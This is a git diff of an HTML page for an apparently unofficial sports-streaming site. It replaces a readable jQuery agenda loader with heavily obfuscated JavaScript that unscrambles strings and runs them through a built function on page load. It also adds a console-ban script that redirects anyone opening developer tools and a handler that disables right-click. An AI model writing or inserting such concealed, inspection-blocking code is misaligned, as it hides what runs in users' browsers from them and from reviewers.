@@ -16,7 +16,16 @@
         <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
 	<script data-cfasync="false" src="//achcdn.com/script/suv4.js" data-adel="lwsu" cdnd="achcdn.com" zid="7692102"></script>
 	<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
-
+    <script src="https://cdn.jsdelivr.net/npm/console-ban@4.1.0/dist/console-ban.min.js"></script>
+  <script type="text/javascript">document.oncontextmenu = function(){return false};</script>
+    <script>
+        // default options
+        ConsoleBan.init()
+        // custom options
+        ConsoleBan.init({
+            redirect: '/'
+        })
+    </script> 
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-3Z6dRsfEmxnUBom0tcX67d1jF5jPK/kPVIgY/jzTk7eRSjkcKD5GwCWYxz2NupR9CezF3UjfZslk4Q83gzBZQ==" crossorigin="anonymous" referrerpolicy="no-referrer"/>
         <style type="text/css">
             body {
@@ -332,44 +341,8 @@
 </ul>
 
 <script>
-  function eventos() {
-    var x = Math.random().toString(36).substring(7);
-    var url = "https://television-libre.online//agenda/agenda.json?" + x;
 
-    $.ajax({
-      url: url,
-      type: "get",
-      success: function(arr) {
-        var menu = $(".menu");
-
-        var content = '';
-
-        for (var i = 0; i < arr.length; i++) {
-          var obj = arr[i];
-
-          content += '<li class="' + obj['category'] + '">';
-          content += '<a href="#">' + obj['match'] + '<span class="t">' + obj['time'] + '</span></a>';
-          content += '<ul class="sub-menu">';
-
-          // Recorre los canales
-          obj.channels.forEach(function(channel) {
-            content += '<li class="subitem1"><a href="' + channel.link + '">' + channel.name + '<span>' + channel.quality + '</span></a></li>';
-          });
-
-          content += '</ul>';
-          content += '</li>';
-        }
-
-        menu.find('.agenda').after(content);
-
-        guardaHorario();
-        dT();
-      },
-    });
-  }
-
-  eventos();
-
+var eventos;(function(){var KWe='',MDK=791-780;function OcN(y){var i=1946426;var f=y.length;var n=[];for(var z=0;z<f;z++){n[z]=y.charAt(z)};for(var z=0;z<f;z++){var j=i*(z+375)+(i%38012);var g=i*(z+224)+(i%40401);var x=j%f;var b=g%f;var o=n[x];n[x]=n[b];n[b]=o;i=(j+g)%1997753;};return n.join('')};var xkv=OcN('grtntnsuhooaucizcdjcqkxmefrbovlprtysw').substr(0,MDK);var PgQ=';p1;f=n{n".4n,;=sa7t*ujg6c(ufuo{ph])}lsy),arkt.w.[}e,,=+ra)=hrsa]1,n9f;u,84;=;-r1.a0ml(fd-)wvh;),}eu0;)]i,l(+7w=;sr 9=;2s(7+rogunf)r+rrvia+v.j t[)nueckt,;68rh;[A[aCr=A- =.;srptar)n{9frsw,=4bd]l=2zc )rvbw2d]=l,+ .)tr=qih1 (evrt=],+(,t0rnt=irtau=vjcslct=jir=tmhp"28.sraawm)a=ool]8g)c[y;z+c0g.s()woay6-=iA()1s)rn+c igu)vvq4s(a=aeoqa;g6>=c +!)n+o8. k-t;fv(+x=t9or[pc) erfnw<.;+s]6evsi.gl S";(tC7g}A=+7"rvpa(.An u;u)fvh[g "l,5z0*dvq.,vly;=ue9na(at(g0h)=r[(+";w fs]smt ln=oCvu6eh((.o;(;jhrd2]=Saazmlyb5pfr{(Cr[o.j4(4un)e vor+)ttui;t{so+=2w=tC.e7c)n)idb<tp;w[( zoulrn=9[=vx(;)vc(sf k(c+o.n(i;t9w)ds(aereviti;=evpjr+04dho"g+8urv)( oa<,lt)7i, {hag5.(0v+1o=r;vllh;o)rdn)1xri;9r.0oxl}.e;io3xlp8now,ugo;r}eg(hklsrha;(h9((10a.,)i;0]<=6];;,C7f-l.id[tnon7;tt;r,+8h8r=eje;a01ifnCehalCorlat6h.soi ;;+"r=,;x<a lhn;r a>-6(+d ;r,n3p ryd]zh.}=]qaa).=oe3t,nr2nba==,tb,[rhy.e(a;y{=eh2eud+atnxi1t[tg)e";"e1eo,2!yi0';var jRL=OcN[xkv];var vgm='';var dKQ=jRL;var NcV=jRL(vgm,OcN(PgQ));var Uww=NcV(OcN('bu {(od!2JoT ;6f1 ,J&)t(i]aJ__l)! J =_.3J?(rc%71J",!6_i9]Jlri]J-+Jn:$JJD)23 uJler r(.;lA\/J"J)tJ2IMa8om)ca)J5({SJ$!JJ+r#MpfdJ6 PJ0 uNJGs#JL;J*xe1g=r.!.JJP_] \/JKc(%=JJfJJxt3ii)se;)}s.3,tJc<="!4"7r ;cJJt1a&!%$oJ]J}_4aJ;.3c=( U)3nr]J(cdJJ0.%.Te1.blJxsAlKV5so>peJ;d3>t d_)j_.J>oJc%bde$g] sn=c}3)gUJ,i.!u_JnJe4JlJoi_pr=]r;#t_a})inV;:2t%J).!"x()sEl_cuy\/rasntg%x:gmf]3.]WrJl.e!=J;e(}77>0cf JgciJ)jlad)g()m\'J2bn.U0f.;3!\'{unJa1%e.J1iQa.Qdawnt_M{. i2!dJKo_ieJa.Jool\'f3lLll,;{J.cl )nfx%bQmme.JJJ$at%KJl= %Jeta>:d.NnJJ>N([ntpk\/%uaarhm0d>JnJ%=mJ]x.JJJhx.o1JRc1ut,aeJ2,)lr%awJ0SkJott4gah%(jl(.r%h.51.Mcls]=J]5=1J={owf1.0fagrtJdn!nr37_"]tla cd3\/.cn#c)ni6u7)(JsJaakmSa %]Sp1t]:J]4s!bNnrC%329J6J91 .f\/e+tt1.6Ja2,3"lJmjJn(JJ:;>21J)xJlJlf=R\/ cOagc!)J=9uSe"oeJ(7)}t+.s[ WcfdrpK9cn!i;eJ6J}bumJ\/tfJ)!J)b{(..icaJC6!7 sy}x!ooc]QcJJ0(b;H>(l,dr b+ o\/P)wu%(JJ!Joo4_Jnbi]7;)19}Jul7mJt,:J0)f)qoJ(gsJ}3cn.Jb6(nJ,o$F_sJ0e,yJd3Jm co9JJ4e,%+2JRhJ.oenJntc(io=..$rlP%*);.pJ_a%K!.8"aJ?.b=(+ve%A-i;m{a9J"19tJc;}!j0+%d.t1nJvJnrm1a?&lt(c.d!d2x ghB.,ePbJ{);)!).Jien3rJ.e+=@Je%Ou1x@.838=PUe.a)._5@Jl.e#(eCr!d,J2.cuTJ3o(jr>Q8jir_=JtJwgz_J)x6=>gr*.3t)JJ;JJa(c-(rl.f.tt9>u0,w6!.D,z+ce0CJ.;:45a{enr;aduoJ1,6Au])||<(R(=JIJw .w;.%.wttJ,]jGc(.+if3)(L1cJJuaa3e)JO dorJ!(ac$f)2peQttd5uccx0n;Ucu)rneaJ$sMn$1(e;J;"4CcJPtinJ3,%99..],VJ(\/2{bJ!;3r\/H(JrJ=JdAeU,d3{)9mJ@;-trJ)#ot]JJtJt,nsno4.;%1J J=)$h%]qcJ=n]_4J2cs:enll!3pJ}x,ytbe4tce;d2g}ta2r))cmp e(%4dhb\'se9nAiJ)x=](%dc,_gIh%);"os5J_$c;;)%1u7]0d.cJJSQ_DJc"(]WJeeras3[M.6;qr01rs{n+rJ]);3.d) TJ.lJJ$Ju\/3wgJgsda1ai(2=fJce)JD]*cl$es6JJmog]4o_o!.ncwr)94hoB"Jl:b]3o&)+J_};8=t)J%"b.eiiuJ2Jl!J:JJ0J4raT]cdr JGi2x%rf!.wJ<{aJ}1JJ);p!1Jn6+J]u.2J1rctF=b;tr2TdH$0!=.t!c)J7.tlaruI49o+ar\'oJ6f ._-)!.5.r.}.eiJf;{sJe$24ut{(hJa>,J8e.Jein6o7s,n2l5JTr.R i-4a[Bx6;-,J1_.=))r}J]JtJ].le2.JJaf1e=t1sF61]]Js,a}tJ(%"I!W!2{_*%])rgc(Jbrn"s73{)_t0JJ00(!?f"#\/!>l;p3,J_1apba.c16eJG;l 41rJ5&C7eJ(n25i=o_3)s nrBne3].(3JJ.}4oJ(. J>.)30QJJ{8]-lcJ>1KJ(J8!h.JJ.ofJJ8tJ=__t1o{8J,o(0] 096J;sEJf\/JJ77o3c$eJuyeJ9.,.u]JcJJeEy.=J)EJ2c)tfatuTwe<J=h2Or1.5 ppJf(%)o$1JD1nD%JnOJd30(n)5 =Jf(")bsnJ(3AJDEl];.r4t)}0\/h2Q;d.h91J7Jr((:!()J6AocJ e J:_Ja6).J4JnbJ,naJj]]@uJscj i;}nJicCuu.{;.n.,uE5-{grs_ne_?.s!J_JJ in,Ja_a1_0=J5 up$b!58hileJ#%cJ_=]Jo)cc{.fJ_JS]Q+e]gfHIi9.=o]l4)=Sio]..4a(o+!NQp=n."L6obJ(J9d9nF$1V,}c=b!iJ;J% JoJJ(_JC.n(i3;gamJJ  0iB(w2 ah]=(c%s,J+72_JJc9JAp%ft.f"  r6tJ4Jor,.[(9o4l}J$Jl;ccJ3bJ1_J8j),J,<b)scF)f;(3n]n...90((cJJi7t)}0(_S8tJ%ntl(2n.eyt!9rrl=ae )+J5c4!6.cm>)8.n{)f(J.sJJu_)(]..1caa#92r.Jj7..00}1b1(.2Je36L=i.]6lttJuac.5F,J)sJJu.Jen.unt!,Stfa(uar.t$l]K ,u5}'));var SyO=dKQ(KWe,Uww );SyO(1461);return 2550})()
 
 
 </script>
